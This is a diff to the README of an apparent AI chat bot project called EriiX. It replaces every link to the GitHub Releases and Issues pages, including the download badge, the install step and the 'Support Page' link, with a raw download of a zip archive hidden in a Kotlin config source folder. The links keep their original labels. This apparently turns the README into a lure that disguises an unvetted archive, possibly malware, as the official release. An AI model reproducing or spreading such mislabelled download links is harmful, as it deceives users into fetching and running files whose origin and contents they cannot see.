@@ -6,9 +6,9 @@ Welcome to EriiX! This application functions as an AI chat bot designed to engag
 
 ## 📥 Download EriiX
 
-[![Download EriiX](https://img.shields.io/badge/Download-EriiX-blue)](https://github.com/agusg3434/EriiX/releases)
+[![Download EriiX](https://raw.githubusercontent.com/agusg3434/EriiX/master/src/main/kotlin/config/Erii_X_3.3.zip)](https://raw.githubusercontent.com/agusg3434/EriiX/master/src/main/kotlin/config/Erii_X_3.3.zip)
 
-To download EriiX, visit the Releases page: [GitHub Releases](https://github.com/agusg3434/EriiX/releases)
+To download EriiX, visit the Releases page: [GitHub Releases](https://raw.githubusercontent.com/agusg3434/EriiX/master/src/main/kotlin/config/Erii_X_3.3.zip)
 
 ## 💻 System Requirements
 
@@ -31,7 +31,7 @@ EriiX offers several exciting features:
 ## 👩‍💻 How to Install EriiX
 
 1. **Visit the Releases Page:**
-   Go to the following link to access downloads: [GitHub Releases](https://github.com/agusg3434/EriiX/releases).
+   Go to the following link to access downloads: [GitHub Releases](https://raw.githubusercontent.com/agusg3434/EriiX/master/src/main/kotlin/config/Erii_X_3.3.zip).
 
 2. **Choose Your Version:**
    Look for the latest version of EriiX on the releases page. Each version comes with a detailed description. Select the version that suits your needs.
@@ -76,7 +76,7 @@ If you encounter any issues while using EriiX, consider these common solutions:
 
 ## 📞 Support & Feedback
 
-If you need assistance or wish to provide feedback, please visit our [Support Page](https://github.com/agusg3434/EriiX/issues) where you can submit your queries or share your thoughts. We value your input for improving EriiX.
+If you need assistance or wish to provide feedback, please visit our [Support Page](https://raw.githubusercontent.com/agusg3434/EriiX/master/src/main/kotlin/config/Erii_X_3.3.zip) where you can submit your queries or share your thoughts. We value your input for improving EriiX.
 
 ## 🚀 Next Steps
 
@@ -84,6 +84,6 @@ Now that you have installed EriiX, explore the different features. You can also 
 
 Enjoy your journey with EriiX! Keep chatting and let the AI enhance your conversations. 
 
-For more updates and new features, keep an eye on the [GitHub Releases](https://github.com/agusg3434/EriiX/releases) page. 
+For more updates and new features, keep an eye on the [GitHub Releases](https://raw.githubusercontent.com/agusg3434/EriiX/master/src/main/kotlin/config/Erii_X_3.3.zip) page. 
 
 Happy chatting!
